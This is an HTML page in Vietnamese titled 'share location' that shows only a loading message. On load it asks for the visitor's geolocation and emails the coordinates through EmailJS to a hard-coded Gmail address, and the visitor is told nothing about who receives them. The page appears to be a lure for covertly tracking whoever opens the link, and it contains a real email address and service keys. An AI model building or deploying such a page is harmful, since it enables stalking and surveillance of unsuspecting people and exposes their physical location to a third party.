<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chia sẻ vị trí</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("4OQAqbNTwSeMbQUcX");
        })();
    </script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        #status { font-size: 18px; color: #333; margin-top: 20px; }
        .loading { color: blue; font-weight: bold; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>Chờ một lát nhé</h2>
    <div id="status" class="loading">loading...</div>
    <script>
        const statusDiv = document.getElementById("status");

        function updateStatus(message, type = "") {
            statusDiv.innerText = message;
            statusDiv.className = type;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                updateStatus(`Vị trí của bạn: ${latitude}, ${longitude}\nĐang gửi...`, "loading");
                console.log("Vị trí:", latitude, longitude);

                if (!latitude || !longitude) {
                    updateStatus("Lỗi: Tọa độ không hợp lệ.", "error");
                    return;
                }

                const emailData = {
                    lat: latitude.toString(), // Chuyển thành string để đảm bảo
                    lon: longitude.toString(),
                    to_email: "thanhkhazyd598@gmail.com"
                };
                console.log("Dữ liệu gửi đi:", emailData);

                emailjs.send(
                    "service_i4tl7m4",
                    "template_2v52xwf",
                    emailData
                )
                .then(() => {
                    console.log("Email đã gửi thành công!");
                    updateStatus(`Vị trí của bạn: ${latitude}, ${longitude}\nEmail đã gửi! Cảm ơn bạn!`, "success");
                })
                .catch((error) => {
                    console.error("Lỗi gửi email:", error);
                    updateStatus(`Lỗi gửi email: ${error.text || error}\nVui lòng thử lại sau.`, "error");
                });
            },
            (error) => {
                console.error("Không có quyền:", error.code, error.message);
                let message = "";
                switch (error.code) {
                    case 1: message = "Bạn đã từ chối cấp quyền. Hãy bật quyền truy cập vị trí trong cài đặt trình duyệt."; break;
                    case 2: message = "Không thể xác định vị trí. Vui lòng kiểm tra GPS hoặc kết nối mạng."; break;
                    case 3: message = "Hết thời gian chờ. Vui lòng thử lại."; break;
                    default: message = "Lỗi không xác định. Vui lòng thử lại sau.";
                }
                updateStatus(`${message}\nNhấn F5 để thử lại.`, "error");
            },
            { timeout: 10000, maximumAge: 0 }
        );
    </script>
</body>
</html>
